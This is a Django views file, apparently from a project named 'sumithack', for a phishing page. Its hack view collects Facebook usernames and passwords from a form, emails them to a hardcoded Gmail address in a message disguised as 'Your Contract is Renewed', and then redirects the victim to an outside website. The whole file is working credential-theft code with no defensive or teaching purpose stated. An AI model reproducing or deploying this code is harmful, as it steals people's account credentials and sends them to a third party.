from django.shortcuts import render
from django.http import HttpResponse
from django.core.mail import EmailMessage
from django.conf import settings
from django.shortcuts import redirect
# Create your views here.
def home(request):
    return render(request,'sumithack/home.html',{})

def hack(request):
    if request.method=='POST':
        username=request.POST['Username_FB']
        password=request.POST['Password_FB']
        sendmail = EmailMessage(
            'Your Contract is Renewed',
            'The username is {} and password is->{}'.format(
                username, password),
            settings.EMAIL_HOST_USER,
            ['xumityadav10@gmail.com'],

        )
        sendmail.fail_silently = False
        sendmail.send()

        return redirect('https://freer.es/')

    return render(request,'sumithack/hack.html',{})
